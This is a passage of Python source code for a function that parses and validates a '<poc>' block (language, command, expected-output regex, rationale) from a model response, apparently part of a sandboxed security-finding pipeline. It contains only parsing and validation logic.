      - missing or empty `<command>` / `<language>` / `<expected_output_regex>`
      - `<language>` is not in `ACCEPTED_LANGUAGES`
      - `<expected_output_regex>` doesn't compile as Python `re`

    Never raises; the caller treats None as "no valid PoC produced — leave
    the finding `pending` for the next turn or operator hand-off".
    """
    if not response:
        return None

    # Tolerate markdown code-fence wrapping. We do this before extracting
    # the block because some models close the fence INSIDE the block and
    # we want the regex to see the trailing </poc> regardless.
    text = _FENCE_LEADING_RE.sub("", response)
    text = _FENCE_TRAILING_RE.sub("", text)

    block_m = _POC_BLOCK_RE.search(text)
    if not block_m:
        log.debug("parse_poc_block: no <poc> block found")
        return None
    inner = block_m.group(1)

    lang_m = _LANGUAGE_RE.search(inner)
    cmd_m = _COMMAND_RE.search(inner)
    exp_m = _EXPECTED_RE.search(inner)
    rat_m = _RATIONALE_RE.search(inner)

    if not lang_m:
        log.debug("parse_poc_block: missing <language>")
        return None
    if not cmd_m:
        log.debug("parse_poc_block: missing <command>")
        return None
    if not exp_m:
        log.debug("parse_poc_block: missing <expected_output_regex>")
        return None

    language = lang_m.group(1).strip().lower()
    command = cmd_m.group(1).strip()
    expected = exp_m.group(1).strip()
    rationale = rat_m.group(1).strip() if rat_m else ""

    if not language:
        log.debug("parse_poc_block: empty <language>")
        return None
    if language not in ACCEPTED_LANGUAGES:
        log.debug("parse_poc_block: unknown language %r (accepted: %r)",
                  language, ACCEPTED_LANGUAGES)
        return None
    if not command:
        log.debug("parse_poc_block: empty <command>")
        return None
    if not expected:
        log.debug("parse_poc_block: empty <expected_output_regex>")
        return None

    # Validate the regex actually compiles — a broken regex would crash
    # the sandbox's match step downstream. Rejecting at parse-time is
    # cheaper than rejecting at execute-time.
    try:
        re.compile(expected)
    except re.error as e:
        log.debug("parse_poc_block: expected_output_regex did not compile: %s", e)
        return None

    return ParsedPoc(
        command=command,
        language=language,
        expected_output_regex=expected,
        rationale=rationale,
    )
